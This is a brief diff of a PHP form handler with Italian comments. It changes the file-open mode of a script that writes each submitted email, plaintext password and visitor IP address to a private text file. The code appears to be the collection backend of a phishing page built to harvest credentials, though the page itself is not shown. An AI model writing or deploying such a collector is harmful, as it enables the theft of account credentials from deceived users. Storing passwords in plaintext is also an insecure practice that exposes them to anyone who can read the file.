@@ -5,7 +5,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $ip = $_SERVER['REMOTE_ADDR'];
 
     // Apre il file (o lo crea se non esiste) in modalità append
-    $file = fopen("../private/info.txt", "a");
+    $file = fopen("../private/info.txt", "a+");
 
     // Scrive il contenuto nel file
     fwrite($file, "Mail: " . $mail . "   Password: " . $password . "   IP= " . $ip . "\n");
